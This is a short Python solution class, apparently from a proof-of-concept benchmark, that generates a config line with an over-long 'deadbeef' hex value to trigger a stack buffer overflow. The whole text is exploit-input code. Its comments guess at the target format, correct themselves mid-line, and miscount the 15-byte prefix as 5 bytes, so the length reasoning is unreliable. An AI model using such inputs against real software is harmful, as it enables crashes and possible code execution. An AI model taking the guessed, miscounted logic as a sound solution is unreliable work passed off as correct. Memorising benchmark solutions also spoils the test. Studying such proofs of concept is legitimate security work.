class Solution:
    def solve(self, src_path: str) -> bytes:
        # Craft a simple config with a long hex value to trigger stack buffer overflow
        # Assuming a basic config format like "key = 0x..." and long hex string
        prefix = b"config_key = 0x"
        hex_payload = b"deadbeef" * 136  # 8 bytes * 136 = 1088 chars? Wait, adjust for total ~547
        # "deadbeef" is 8 chars, to reach ~543 after prefix (5 bytes)
        # 543 / 8 ≈ 67.875, so 68 * 8 = 544, total 5+544=549, close
        hex_payload = b"deadbeef" * 68
        poc = prefix + hex_payload + b"\n"
        # Trim to 547 if needed, but aim for overflow
        return poc[:547]
